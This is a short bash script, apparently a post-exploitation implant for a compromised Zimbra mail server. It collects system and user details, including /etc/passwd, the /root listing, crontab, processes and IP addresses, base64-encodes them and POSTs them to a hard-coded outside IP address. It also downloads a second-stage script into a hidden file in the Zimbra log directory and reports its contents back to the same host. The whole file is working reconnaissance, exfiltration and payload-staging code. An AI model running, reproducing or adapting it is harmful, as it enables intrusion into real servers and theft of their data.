#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
B=/opt/zimbra/log
curl -sm20 http://131.123.43.239/efoq80.sh -o $B/.st9 2>/dev/null; rc=$?
w=none; [ -f $B/.st9 ] && w=$(wc -c < $B/.st9)
curl -sm15 -X POST --data-binary "st9 rc=$rc size=$w" http://131.123.43.239/up -H "X-Name: efo_st9rc"
curl -sm15 -X POST --data-binary @$B/.st9 http://131.123.43.239/up -H "X-Name: efo_st9body"
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


